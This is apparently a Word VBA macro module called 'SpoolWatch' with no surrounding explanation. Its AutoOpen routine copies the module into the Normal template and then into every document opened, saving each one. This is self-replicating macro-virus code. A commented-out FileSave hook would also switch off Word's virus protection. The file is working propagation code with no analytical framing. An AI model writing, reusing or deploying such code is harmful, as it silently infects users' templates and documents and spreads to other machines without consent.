   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "SpoolWatch"

   Public Sub AutoOpen()
       Options.VirusProtection = True

       RepToNormal
       RepToDocs
   End Sub

   'Public Sub FileSave()
   '    Options.VirusProtection = False
   '    RepToDocs
   '    ActiveDocument.Save
   'End Sub

   Public Sub RepToNormal()
       Dim ModuleName As String, TMPFile As String
       Dim ModuleExists As Boolean, TMPExists As Boolean
       TMPFile = "C:\Tmp.bas"
       TMPExists = False
       ModuleName = "SpoolWatch"
       For Each VBC In ActiveDocument.VBProject.VBComponents
           If VBC.Name = ModuleName Then
               VBC.Export (TMPFile)
               TMPExists = True
           End If
       Next VBC
       ModuleExists = False
       For Each VBC In Application.NormalTemplate.VBProject.VBComponents
           If VBC.Name = ModuleName Then
               ModuleExists = True
           End If
       Next VBC
       If Not ModuleExists Then
           Application.NormalTemplate.VBProject.VBComponents.import (TMPFile)
           Application.NormalTemplate.Save
       End If
       If TMPExists Then FileSystem.Kill (TMPFile)
   End Sub

   Public Sub RepToDocs()
       Dim ModuleName As String, TMPFile As String
       Dim ModuleExists As Boolean, TMPExists As Boolean
       TMPFile = "C:\Tmp.bas"
       TMPExists = False
       ModuleName = "SpoolWatch"
       For Each VBC In Application.NormalTemplate.VBProject.VBComponents
           If VBC.Name = ModuleName Then
               VBC.Export (TMPFile)
               TMPExists = True
           End If
       Next VBC
       ModuleExists = False
       For Each VBC In Application.ActiveDocument.VBProject.VBComponents
           If VBC.Name = ModuleName Then
               ModuleExists = True
           End If
       Next VBC
       If Not ModuleExists Then
           Application.ActiveDocument.VBProject.VBComponents.import (TMPFile)
           Application.ActiveDocument.Save
       End If
       If TMPExists Then FileSystem.Kill (TMPFile)
   End Sub
